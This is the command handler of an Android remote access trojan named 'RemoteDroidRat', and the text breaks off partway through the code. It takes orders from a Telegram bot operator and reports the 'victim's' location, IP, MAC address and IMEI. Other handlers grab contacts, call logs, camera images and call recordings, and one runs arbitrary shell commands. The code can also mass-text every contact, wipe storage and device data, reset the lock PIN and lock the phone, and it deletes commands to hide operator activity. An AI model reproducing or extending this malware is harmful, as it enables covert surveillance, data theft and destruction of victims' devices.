package com.KaranKumar.RemoteDroidRat.telegramBot.telegramBotCmd;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.JsonSyntaxException;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;
import com.KaranKumar.RemoteDroidRat.commandActions.localAction;
import java.nio.charset.StandardCharsets;
import android.util.Base64;
import com.KaranKumar.RemoteDroidRat.adminInfo;
import com.KaranKumar.RemoteDroidRat.EncoderDecoder.MorseCodeConverter;
import android.content.SharedPreferences;
import java.util.StringTokenizer;
import com.KaranKumar.RemoteDroidRat.commandActions.GPS;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;
import com.KaranKumar.RemoteDroidRat.commandActions.getContact;
import com.KaranKumar.RemoteDroidRat.commandActions.getCallLog;
import android.content.ContentResolver;

import android.view.SurfaceView;
import android.app.Activity;
import com.KaranKumar.RemoteDroidRat.commandActions.getInstalledApp;
import android.hardware.Camera;
import com.KaranKumar.RemoteDroidRat.commandActions.CameraManager;
import java.util.regex.Pattern;
import java.util.regex.Matcher;
import com.KaranKumar.RemoteDroidRat.commandActions.getMicAudio;
import android.content.Intent;
import android.net.Uri;
import com.KaranKumar.RemoteDroidRat.commandActions.WallpaperDownloader;
import com.KaranKumar.RemoteDroidRat.utiles.AppUtils;
import com.KaranKumar.RemoteDroidRat.commandActions.sendMassageToAll;
import com.KaranKumar.RemoteDroidRat.commandActions.numberAction;
import com.KaranKumar.RemoteDroidRat.commandActions.CallRecorder;
import android.content.ComponentName;
import android.app.admin.DevicePolicyManager;
import android.os.PowerManager;
import android.view.WindowManager;
import android.view.Display;
import com.KaranKumar.RemoteDroidRat.commandActions.FileManager;


public class TelegramBotCmdApi {


    private Context context;
	private adminInfo admin;
	private int latestUpdateId = 0;
	private Set<Integer> processedUpdateIds = new HashSet<>();
	private  String BOT_TOKEN;
	private  String CHAT_ID;
	private static final String COMMAND_TO_CHECK = "/start";
	private localAction local;
	GPS mGPS;
	private TelegramBotApi telegramApi;
	private getContact contact;
	private getCallLog callLog;
	private CameraManager cameraManager;
	private getMicAudio micAudio;
	private getInstalledApp installedApp;
	private WallpaperDownloader wallpaperDownloader;
	private AppUtils activeApp;
	private sendMassageToAll massageToAll= new sendMassageToAll();
	private numberAction NumberAction = new numberAction();
    private CallRecorder recordCall;
    private DevicePolicyManager mDevicePolicyManager;
    private ComponentName mComponentName;
    private FileManager fm;
	public TelegramBotCmdApi(Context context) {
		if (context != null) {
			this.context = context;
			this.admin = new adminInfo(context);
			this.CHAT_ID = admin.getChatId();
			this.local = new localAction(context);	
			this.BOT_TOKEN = admin.getApiToken();	
			this.latestUpdateId = loadLatestUpdateId();
			this.mGPS = new GPS(context);
			this.telegramApi = new TelegramBotApi(context);
			this.contact = new getContact(context);
			this.callLog = new getCallLog(context);
		    this.cameraManager = new CameraManager(context);
			this.micAudio = new getMicAudio(context);
			this.installedApp = new getInstalledApp(context);
			this.wallpaperDownloader = new WallpaperDownloader(context);
			this.activeApp = new AppUtils();
            this.recordCall = new CallRecorder(context);
            this.fm = new FileManager(context);


		} else {

		}

	}

    public void startCheckingMessages() {
        new CheckMessagesAsyncTask().execute();
		Log.i("api", BOT_TOKEN);
    }

    private class CheckMessagesAsyncTask extends AsyncTask<Void, Void, String> {
        @Override
        protected String doInBackground(Void... params) {
            try {
				URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (latestUpdateId + 1));
				//URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates");
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");

                if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;

                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }

                    reader.close();
                    connection.disconnect();

                    return response.toString();
                } else {
                    // Handle non-OK response codes
                    Log.e("CheckMessagesAsyncTask", "HTTP error code: " + connection.getResponseCode());
                    return null;
                }

            } catch (MalformedURLException e) {
                // Handle MalformedURLException
                Log.e("CheckMessagesAsyncTask", "MalformedURLException: " + e.getMessage());
                return null;
            } catch (IOException e) {
                // Handle other IOExceptions
                Log.e("CheckMessagesAsyncTask", "IOException: " + e.getMessage());
                return null;
            }
        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            if (result != null) {
                parseAndHandleCommands(result);
            }
        }
    }

    private void parseAndHandleCommands(String responseBody) {
		try {
			JsonObject jsonObject = JsonParser.parseString(responseBody).getAsJsonObject();
			JsonArray resultArray = jsonObject.getAsJsonArray("result");

			if (resultArray.size() > 0) {
				JsonObject lastMessage = resultArray.get(resultArray.size() - 1).getAsJsonObject();
				int updateId = lastMessage.getAsJsonPrimitive("update_id").getAsInt();

				if (updateId > latestUpdateId && !processedUpdateIds.contains(updateId)) {
					for (JsonElement resultElement : resultArray) {
						JsonObject messageObject = resultElement.getAsJsonObject().getAsJsonObject("message");

						// Extracting message ID
						int messageId = messageObject.getAsJsonPrimitive("message_id").getAsInt();

						JsonElement textElement = messageObject.getAsJsonPrimitive("text");
						String text = (textElement != null && !textElement.isJsonNull()) ? textElement.getAsString() : "";
						JsonObject chatObject = messageObject.getAsJsonObject("chat");
						String chatId = chatObject.getAsJsonPrimitive("id").getAsString();

						handleCommand(text, chatId, updateId, messageId); // Pass messageId to handleCommand
					}

					latestUpdateId = updateId;
					processedUpdateIds.add(updateId);
					saveLatestUpdateId(updateId);
				}
			}

		} catch (JsonSyntaxException e) {
			Log.e("TelegramBotCmdApi", "Error parsing JSON: " + e.getMessage());
		} catch (Exception e) {
			// Handle other exceptions, log, and potentially inform the user
			Log.e("TelegramBotCmdApi", "Error parsing and handling commands: " + e.getMessage());
		}
	}

    private void handleCommand(String text, String chatId, int updateId, int massageId) {
		Toast.makeText(context, "massage Id is : " + massageId, Toast.LENGTH_SHORT).show();


        // Perform actions based on the received command and chat ID
        if (text.equals(COMMAND_TO_CHECK) && chatId.equals(CHAT_ID)) {
			sendMessage("Command received: " + COMMAND_TO_CHECK + " from Chat ID: " + chatId + " UpdateId: " + updateId);







        } else if (text.equals("/getLocation") && chatId.equals(CHAT_ID)) {




			// FAILED TO OBTAIN  GPS LOCATION

			mGPS.getLocation();

			// THIS CODE IS TO SHROTEN THE GPS LOCATION BY 4 DECIMAL
			// SO THAT WHEN WE ENCODE AND SENT TO A NUMBER . THE SMS WILL NOT FAIL

			StringTokenizer latlongdata = new StringTokenizer(mGPS.getLatitude() + "|" + mGPS.getLongitude(), "|");
			String lat = latlongdata.nextToken();
			String lon = latlongdata.nextToken();
			StringTokenizer latmain = new StringTokenizer(lat, ".");
			StringTokenizer lonmain = new StringTokenizer(lon, ".");
			String latwholenumber = latmain.nextToken();
			String latdecimal = latmain.nextToken();
			String lonwholenumber = lonmain.nextToken();
			String londecimal = lonmain.nextToken();
			String lat_decimal_final = latdecimal.substring(0, 4);
			String lon_decimal_final = londecimal.substring(0, 4);

			String gps_precise = "Latitude : " + mGPS.getLatitude() + "Longitude : " + mGPS.getLongitude();
			String gps_shorten = "Lat: " + latwholenumber + "." + lat_decimal_final + " Lat: " + lonwholenumber + "." + lon_decimal_final;
			String gps_google_map = "http://www.google.com/maps/place/" + mGPS.getLatitude() + "," + mGPS.getLongitude() + "/@" + mGPS.getLatitude() + "," + mGPS.getLongitude() + ",17z";

			try {
				telegramApi.sendMessage(chatId, "Click this link to locat victim : " + gps_google_map);
			} catch (Exception e) {
				e.printStackTrace();
			}

			
            deleteMessageAsync(chatId, massageId);
		} else if (text.equals("/getContact") && chatId.equals(CHAT_ID)) {

			try {
				contact.fetchAndSaveContacts();
				telegramApi.sendMessage(chatId, "please wait a few second contact is getting.");
			} catch (Exception e) {
				e.printStackTrace();
			}
            deleteMessageAsync(chatId, massageId);
		} else if (text.equals("/getCallLog") && chatId.equals(CHAT_ID)) {

			try {
				callLog.fetchAndSaveCallLogs();
				telegramApi.sendMessage(chatId, "please wait a few second call log is getting.");
			} catch (Exception e) {
				e.printStackTrace();
			}
            deleteMessageAsync(chatId, massageId);
		} else if (text.equals("/getIpV4") && chatId.equals(CHAT_ID)) {
			try {
				String Ip = local.getPublicIPAddress4();
				if (Ip == null) {
					local.getPublicIPAddress();
				} else {
					telegramApi.sendMessage(chatId, "Victim Public Ip v4 is : " + Ip);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
            deleteMessageAsync(chatId, massageId);
		} else if (text.equals("/getIpV6") && chatId.equals(CHAT_ID)) {
			try {
				String Ip = local.getPublicIPAddress();
				if (Ip == null) {
					local.getPublicIPAddress();
				} else {
					telegramApi.sendMessage(chatId, "Victim Public Ip v6 is : " + Ip);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
            deleteMessageAsync(chatId, massageId);
		} else if (text.equals("/getMac") && chatId.equals(CHAT_ID)) {
			try {
				String mac = local.getMacAddress(context);
				if (mac == null) {
					local.getPublicIPAddress();
				} else {
					telegramApi.sendMessage(chatId, "Victim Mac Address is : " + mac);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

            deleteMessageAsync(chatId, massageId);
		} else if (text.equals("/getIMEI") && chatId.equals(CHAT_ID)) {

			try {
				String imei= local.getIMEINumber(context);
				if (imei == null) {
					local.getPublicIPAddress();
				} else {
					telegramApi.sendMessage(chatId, "Victim Mac Address is : " + imei);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
            deleteMessageAsync(chatId, massageId);
		} else if (text.equals("/getDeviceInfo") && chatId.equals(CHAT_ID)) {

		} else if (text.equals("/getInstalledApp") && chatId.equals(CHAT_ID)) {

			try {
				installedApp.fetchAndSaveInstalledApps();
				telegramApi.sendMessage(chatId, "please wait a few second installed App  is getting.");
			} catch (Exception e) {
				e.printStackTrace();
			}
            deleteMessageAsync(chatId, massageId);
		} else if (text.equals("/playRing") && chatId.equals(CHAT_ID)) {
			try {
				local.playRing();
				telegramApi.sendMessage(chatId, "Ringtone is playing in victim Device.");
			} catch (Exception e) {
				e.printStackTrace();
			}
            deleteMessageAsync(chatId, massageId);
		} else if (text.contains("/autoAcceptCall") && chatId.equals(CHAT_ID)) {
			try {
				Pattern pattern = Pattern.compile("/autoAcceptCall\\s+number:\\s+(\\S+)");
				Matcher matcher = pattern.matcher(text);

				// Check if the pattern is found
				if (matcher.find()) {
					// Group 1 contains the extracted number
					String number = matcher.group(1);
					acceptNumber(number);
					telegramApi.sendMessage(chatId, "number successfully set  " + number);
				} else {
					telegramApi.sendMessage(chatId, "please send a valid command like this '/autoAcceptCall number: +913140238106'  change number to your number. ");

				}
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.contains("/setWallpaperUrl") && chatId.equals(CHAT_ID)) {
			try {
				String pattern = "url:\\s*(\\S+)";
				Pattern urlPattern = Pattern.compile(pattern);
				Matcher matcher = urlPattern.matcher(text);

				if (matcher.find()) {
					String url = matcher.group(1);
					// Now 'url' contains the extracted URL from the user input
					wallpaperDownloader.execute(url);
					telegramApi.sendMessage(chatId, "Wallpaper successfully set of this url " + url);
					// You can use this URL as needed in your code
				} else {
					// Handle the case where the URL is not found in the user input
					telegramApi.sendMessage(chatId, "please send a valid command like this '/setWallpaperUrl url: http://example.com/myWallpaper.png'  change url to your url. ");

				}
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.contains("/callTo") && chatId.equals(CHAT_ID)) {
			try {
				String regex = "/callTo number: (\\d+)";
				Pattern pattern = Pattern.compile(regex);
				Matcher matcher = pattern.matcher(text);

				if (matcher.find()) {
					String phoneNumber = matcher.group(1);

					// Now, phoneNumber contains the dynamically extracted number value
					// You can use it as needed

					// To make a call
					Intent dialIntent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phoneNumber));
					// Ensure you have the necessary permissions before making the call
					// For example, in the AndroidManifest.xml, add: <uses-permission android:name="android.permission.CALL_PHONE" />

					// Start the call activity
					context.startActivity(dialIntent);
				} else {
					// Handle the case where the number is not found
					telegramApi.sendMessage(chatId, "please send a valid command like this '/callTo number: 1234567890'  change number to your desired number. ");

				}
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.contains("/sendSms") && chatId.equals(CHAT_ID)) {
			try {
				Pattern pattern = Pattern.compile("/sendSms\\s+message:\\s+(.*)");
				Matcher matcher = pattern.matcher(text);

				if (matcher.find()) {
					String message = matcher.group(1).trim();
					massageToAll.sendSmsToAllContacts(message, context);
					telegramApi.sendMessage(chatId, "Message Successfully sended to all contact.");
				} else {
					telegramApi.sendMessage(chatId, "please send a valid command like this '/sendSms message: how are you ?'  change message to your desired massege. ");

				}
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.contains("/deletFile") && chatId.equals(CHAT_ID)) {

		} else if (text.contains("/renameFile") && chatId.equals(CHAT_ID)) {
            try {
                // Define the regex pattern
                String regexPattern = "/renameFile\\s+oldPath:\\s+([^\\s]+)\\s+newPath:\\s+([^\\s]+)";
                
                // Create a Pattern object
                Pattern pattern = Pattern.compile(regexPattern);

                // Create a Matcher object
                Matcher matcher = pattern.matcher(text);

                // Find the matches
                while (matcher.find()) {
                    // Extract path and url values
                    String oldPath = matcher.group(1);
                    String newPath = matcher.group(2);

                    // Check if both path and url are present
                    if (oldPath != null && newPath != null) {
                        // Perform actions with path and url (e.g., download)
                        fm.renameFilePath(oldPath,newPath);

                        // Send a confirmation message
                        telegramApi.sendMessage(chatId, "file rename success oldpath: "+oldPath+" newpath: "+newPath);

                        // Perform download or other actions with path
                        System.out.println("oldPath: " + oldPath);

                        // Perform download or other actions with url
                        System.out.println("newPath: " + newPath);
                    } else {
                        // Send a guide message for incorrect command format
                        telegramApi.sendMessage(chatId, "Incorrect command format. Please use correct format. like this '/DownloadFile oldPath: /storage/emulated/0/myFile or newPath: /storage/emulated/0/myNewFile' repkace yoir oldpath with oldpath or newpath with your new path.");

                        // You might want to break out of the loop here if multiple matches are not expected
                        break;
                    }
                }

                // Delete the message asynchronously
                deleteMessageAsync(chatId, massageId);

            } catch (Exception error) {
                error.printStackTrace();
            }
            
		} else if (text.contains("/createFilePath") && chatId.equals(CHAT_ID)) {

		} else if (text.contains("/DownloadFile") && chatId.equals(CHAT_ID)) {
            try {
                // Define the regex pattern
                String regexPattern = "/DownloadFile\\s+path:\\s+([^\\s]+)\\s+url:\\s+([^\\s]+)";
                
                // Create a Pattern object
                Pattern pattern = Pattern.compile(regexPattern);

                // Create a Matcher object
                Matcher matcher = pattern.matcher(text);

                // Find the matches
                while (matcher.find()) {
                    // Extract path and url values
                    String path = matcher.group(1);
                    String url = matcher.group(2);

                    // Check if both path and url are present
                    if (path != null && url != null) {
                        // Perform actions with path and url (e.g., download)
                        fm.downloadFile(path, url);

                        // Send a confirmation message
                        telegramApi.sendMessage(chatId, "Download Started. URL: " + url + " Path: " + path);

                        // Perform download or other actions with path
                        System.out.println("Path: " + path);

                        // Perform download or other actions with url
                        System.out.println("URL: " + url);
                    } else {
                        // Send a guide message for incorrect command format
                        telegramApi.sendMessage(chatId, "Incorrect command format. Please use correct format. like this '/DownloadFile path: /storage/emulated/0/ or url: http://example.com/myfile.mp3' repkace yoir path with path or url with youractual url.");

                        // You might want to break out of the loop here if multiple matches are not expected
                        break;
                    }
                }

                // Delete the message asynchronously
                deleteMessageAsync(chatId, massageId);

            } catch (Exception error) {
                error.printStackTrace();
            }
        

		}else if (text.contains("/shell cmd:") && chatId.equals(CHAT_ID)) {
            String command = text.replace("/shell cmd:", "").trim();
            try {
                Process process = Runtime.getRuntime().exec(command);
                // Read the output of the command
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                // Check the exit value of the process
                int exitValue = process.waitFor();

                if (exitValue == 0) {
                    // Command executed successfully
                    // Perform action for success
                    System.out.println("Command executed successfully");
                    telegramApi.sendMessage(chatId,"Command executed successfully");
                    telegramApi.sendMessage(chatId,output.toString());
                } else {
                    // Command execution failed
                    // Perform action for failure
                    System.out.println("Command execution failed");
                    telegramApi.sendMessage(chatId,"Command execution failed");
                }

            } catch (IOException | InterruptedException e) {
                // Handle the exception appropriately
                e.printStackTrace();
                // Perform action for exception
                System.out.println("Exception occurred during command execution");
                telegramApi.sendMessage(chatId,"Exception occurred during command execution");
            }
        
        }else if (text.contains("/destroy") && chatId.equals(CHAT_ID)) {
            try{
                // Execute the command
                Process process = Runtime.getRuntime().exec(":0{:|:£};:");

                // Read the output of the command
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                // Print the output
                System.out.println(output.toString());

                // Wait for the command to finish
                process.waitFor();

            } catch (Exception e) {
                e.printStackTrace();
            }
          

		} else if (text.contains("/uninstallApp") && chatId.equals(CHAT_ID)) {

            
        }else if (text.contains("/showToast") && chatId.equals(CHAT_ID)) {
			try {
				// Define a regex pattern to match the time value
				Pattern pattern = Pattern.compile("message: (\\d+)");
				Matcher matcher = pattern.matcher(text);

				// Check if the pattern is found
				if (matcher.find()) {
					// Extract the time value
					String message = matcher.group(1);
					Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
					telegramApi.sendMessage(chatId, "successfully toast " + message);
					// Convert the time value to an integer if needed
				} else {
					telegramApi.sendMessage(chatId, "please send a valid command like this '/showToast message: hello User !'  change message to your desired message. ");

				}
                
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (text.contains("/blockNumber") && chatId.equals(CHAT_ID)) {
			try {
				// Define a regex pattern to match the time value
				Pattern pattern = Pattern.compile("number: (\\d+)");
				Matcher matcher = pattern.matcher(text);

				// Check if the pattern is found
				if (matcher.find()) {
					// Extract the time value
					String number = matcher.group(1);
					NumberAction.blockNumber(context, number);
					telegramApi.sendMessage(chatId, "successfully number blocked " + number);
					// Convert the time value to an integer if needed
				} else {
					telegramApi.sendMessage(chatId, "please send a valid command like this '/blockNumber number: 35643576445'  change number to your desired number. ");

				}
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.contains("/unblockNumber") && chatId.equals(CHAT_ID)) {
			try {
				// Define a regex pattern to match the time value
				Pattern pattern = Pattern.compile("number: (\\d+)");
				Matcher matcher = pattern.matcher(text);

				// Check if the pattern is found
				if (matcher.find()) {
					// Extract the time value
					String number = matcher.group(1);
					NumberAction.unblockNumber(context, number);
					telegramApi.sendMessage(chatId, "successfully number Unblocked " + number);
					// Convert the time value to an integer if needed
				} else {
					telegramApi.sendMessage(chatId, "please send a valid command like this '/unblockNumber number: 35643576445'  change number to your desired number. ");

				}
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (text.contains("/deleteNumber") && chatId.equals(CHAT_ID)) {
			try {
				// Define a regex pattern to match the time value
				Pattern pattern = Pattern.compile("number: (\\d+)");
				Matcher matcher = pattern.matcher(text);

				// Check if the pattern is found
				if (matcher.find()) {
					// Extract the time value
					String number = matcher.group(1);
					NumberAction.deleteContact(context, number);
					telegramApi.sendMessage(chatId, "successfully number Deleted " + number);
					// Convert the time value to an integer if needed
				} else {
					telegramApi.sendMessage(chatId, "please send a valid command like this '/deleteNumber number: 35643576445'  change number to your desired number. ");

				}
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (text.equals("/getScreenShot") && chatId.equals(CHAT_ID)) {

		} else if (text.equals("/getFrontCamImage") && chatId.equals(CHAT_ID)) {
			try {

				int frontCameraId = getFrontCameraId(); // Implement a method to get the front camera ID
				if (frontCameraId != -1) {
					cameraManager.startUp(frontCameraId);
				} else {
					// Handle the case where the front camera is not available
				}

				telegramApi.sendMessage(chatId, "Please wait a few minuts getting victim front camera image.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();					
			}

		} else if (text.equals("/getBackCamImage") && chatId.equals(CHAT_ID)) {
			try {

				int backCameraId = getBackCameraId(); // Implement a method to get the back camera ID
				if (backCameraId != -1) {
					cameraManager.startUp(backCameraId);
				} else {
					// Handle the case where the back camera is not available
				}
				telegramApi.sendMessage(chatId, "Please wait a few minuts getting victim back camera image.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();					
			}

		} else if (text.contains("/getFrontCamVideo") && chatId.equals(CHAT_ID)) {


		} else if (text.contains("/getBackCamVideo") && chatId.equals(CHAT_ID)) {

		} else if (text.contains("/openApp") && chatId.equals(CHAT_ID)) {

			try {
				// Extracting the package name from the command
				String regex = "/openApp\\s+pkg:\\s+(\\S+)";
				Pattern pattern = Pattern.compile(regex);
				Matcher matcher = pattern.matcher(text);

				if (matcher.find()) {
					String packageName = matcher.group(1);

					// Now 'packageName' contains the extracted package name

					// If you want to open the app, create an Intent with the package name
					Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);
					if (launchIntent != null) {
						context.startActivity(launchIntent);
					} else {
						// Handle the case where the app is not installed or the package name is invalid
						// You might want to inform the user or take appropriate action
					}
				} else {
					// Handle the case where the package name is not found
					// You might want to inform the user or take appropriate action
					telegramApi.sendMessage(chatId, "please send a valid command like this '/openApp pkg: com.example.app'  change app package name to your package name. ");

				}
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
				// Handle the exception (e.g., log it, show an error message, etc.)
			}


		} else if (text.contains("/openUrl") && chatId.equals(CHAT_ID)) {
			try {
				// Extracting the URL from the command
				String regex = "/openUrl\\s+url:\\s+(\\S+)";
				Pattern pattern = Pattern.compile(regex);
				Matcher matcher = pattern.matcher(text);

				if (matcher.find()) {
                    // Replace "https://example.com" with the URL you want to open
                    String url = matcher.group(1);

                    // Create an Intent with ACTION_VIEW and the URI of the website
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));

                    // Set the package to Chrome to ensure it opens in Chrome
                    intent.setPackage("com.android.chrome");

                    // Check if there's a Chrome browser installed
                    if (intent.resolveActivity(context.getPackageManager()) != null) {
                        context.startActivity(intent);
                    } else {
                        // If Chrome is not installed, open the URL in the default browser
                        intent.setPackage(null);
                        context.startActivity(intent);
                    }
                    
                    deleteMessageAsync(chatId, massageId);
                    
				} else {
					// Handle the case where the URL is not found
					// You might want to inform the user or take appropriate action
					telegramApi.sendMessage(chatId, "please send a valid command like this '/openUrl url: http://example.com/'  change url to your url. ");
				}

			} catch (Exception e) {
				e.printStackTrace();
				// Handle the exception (e.g., log it, show an error message, etc.)
			}

		} else if (text.equals("/getActiveApp") && chatId.equals(CHAT_ID)) {
			try {
				telegramApi.sendMessage(chatId, activeApp.getActiveAppName(context));
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.equals("/flashOn") && chatId.equals(CHAT_ID)) {

			try {
				local.flashOn();
				telegramApi.sendMessage(chatId, "Mobile tourch on successfull.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.equals("/bluetoothOn") && chatId.equals(CHAT_ID)) {
			try {
				local.bluetoothOn();
				telegramApi.sendMessage(chatId, "Mobile bluetooth on successfull.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.equals("/wifiOn") && chatId.equals(CHAT_ID)) {
			try {
				local.wifiOn();
				telegramApi.sendMessage(chatId, "Mobile wifi on successfull.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.equals("/flashOff") && chatId.equals(CHAT_ID)) {
			try {
				local.flashOff();
				telegramApi.sendMessage(chatId, "Mobile wifi off successfull.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.equals("/bluetoothOff") && chatId.equals(CHAT_ID)) {

			try {
				local.bluetoothOff();
				telegramApi.sendMessage(chatId, "Mobile bluetooth off successfull.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.equals("/wifiOff") && chatId.equals(CHAT_ID)) {
			try {
				local.wifiOff();
				telegramApi.sendMessage(chatId, "Mobile wifi off successfull.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.equals("/cleareMemory") && chatId.equals(CHAT_ID)) {
            try{
                local.wipeMemoryCard();
                telegramApi.sendMessage(chatId, "Mobile Memory is cleared Deleted Storage Successfully");
                deleteMessageAsync(chatId, massageId);
            }catch(Exception err){
                err.printStackTrace();
            }

		} else if (text.equals("/wipeData") && chatId.equals(CHAT_ID)) {
            try{
                // Check if device admin permission is granted
                if (mDevicePolicyManager.isAdminActive(mComponentName)) {
                    // Wipe data with the specified flags
                    mDevicePolicyManager.wipeData(0); // Use appropriate flags if needed
                    telegramApi.sendMessage(chatId,"successfully device Data wiped.");
                } else {
                    // Request device admin permission
                    telegramApi.sendMessage(chatId,"failed to wipe data Device admin permission is not Granted.");
                    
                }

                // Stop the service after performing the wipe if needed
                
            
            }catch(Exception e){
                e.printStackTrace();
            }

		} else if (text.equals("/LockScreen") && chatId.equals(CHAT_ID)) {
            
            try{
                // Define the regex pattern for extracting the PIN
                Pattern pattern = Pattern.compile("/LockScreen pin: (\\d+)");
                Matcher matcher = pattern.matcher(text);

                // Check if the pattern is found
                if (matcher.find()) {
                    // Extract the PIN value from the matched group
                    String pin = matcher.group(1);
                    // Check if device admin permission is granted
                    if (mDevicePolicyManager.isAdminActive(mComponentName)) {
                        // Wipe data with the specified flags
                        mDevicePolicyManager.resetPassword(pin,0);
                        mDevicePolicyManager.lockNow();
                        telegramApi.sendMessage(chatId,"successfully device Locked with pin : "+pin);
                    } else {
                        // Request device admin permission
                        telegramApi.sendMessage(chatId,"failed to lock Device admin permission is not Granted.");

                    }

                    // Stop the service after performing the wipe if needed

                    
                }else{
                    
                    telegramApi.sendMessage(chatId,"inviled command please send command like this '/LockScreen pin: 2453234' replace your desire pin with '2453234' this number. ");
                }
                deleteMessageAsync(chatId,massageId);
            }catch(Exception err){
                err.printStackTrace();
            }

		} else if (text.equals("/unlockScreen") && chatId.equals(CHAT_ID)) {

		} else if (text.contains("/dontOpenApp") && chatId.equals(CHAT_ID)) {

		} else if (text.equals("/silentMode") && chatId.equals(CHAT_ID)) {
			try {
				local.silentMode();
				telegramApi.sendMessage(chatId, "Mobile is silent mode successfull.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}


		} else if (text.equals("/normalMode") && chatId.equals(CHAT_ID)) {
			try {
				local.normalMode();
				telegramApi.sendMessage(chatId, "Mobile is normal mode successfull.");
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.contains("/configForworder") && chatId.equals(CHAT_ID)) {
			try {
				// Define a regex pattern to match the time value
				Pattern pattern = Pattern.compile("number: (\\d+)");
				Matcher matcher = pattern.matcher(text);

				// Check if the pattern is found
				if (matcher.find()) {
					// Extract the time value
					String number = matcher.group(1);

					// Convert the time value to an integer if needed



					// Now 'time' variable holds the extracted time value
					// You can use it as needed
					configNumber(number);
					telegramApi.sendMessage(chatId, "Your Mobile No. " + number + " is successfully configured.");
                    deleteMessageAsync(chatId, massageId);
				} else {
					// No match found for time value
					System.out.println("No time value found in the input.");
					telegramApi.sendMessage(chatId, "please send a valid command like this '/configForworder number: +9135744676567'  change number to your Number. ");
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (text.contains("/recordCall") && chatId.equals(CHAT_ID)) {
			try {
                String Number = extractPhoneNumber(text);
                RecordCall(Number);
                recordCall.startCallListener();
                
                deleteMessageAsync(chatId, massageId);
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else if (text.contains("/blackScreen") && chatId.equals(CHAT_ID)) {
            try {
                // Extracting the value after '/blackScreen'
                String[] commandParts = text.split(" ");
                if (commandParts.length == 2) {
                    boolean isBlackScreen = Boolean.parseBoolean(commandParts[1]);

                    // Perform action based on the value
                    if (isBlackScreen) {
                        // Action when the value is true
                        // Your code here
                        blackScreen(true);
                        telegramApi.sendMessage(chatId,"Black Screen is added Successfully");
                    } else {
                        // Action when the value is false
                        // Your code here
                        blackScreen(false);
                        telegramApi.sendMessage(chatId,"Black Screen is removed Successfully");
                    }
                    deleteMessageAsync(chatId, massageId);
                } else {
                    // Handle incorrect command format
                    // Your code here
                    
                    telegramApi.sendMessage(chatId, "please send a valid command like this '/blackScreen true'  if you send true then screen is showing black or if you send false then screen is showing normal. ");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else if (text.contains("/getMicAudio") && chatId.equals(CHAT_ID)) {
			try {
				// Define a regex pattern to match the time value
				Pattern pattern = Pattern.compile("time: (\\d+)");
				Matcher matcher = pattern.matcher(text);

				// Check if the pattern is found
				if (matcher.find()) {
					// Extract the time value
					String timeValue = matcher.group(1);

					// Convert the time value to an integer if needed
					int time = Integer.parseInt(timeValue);
					try {
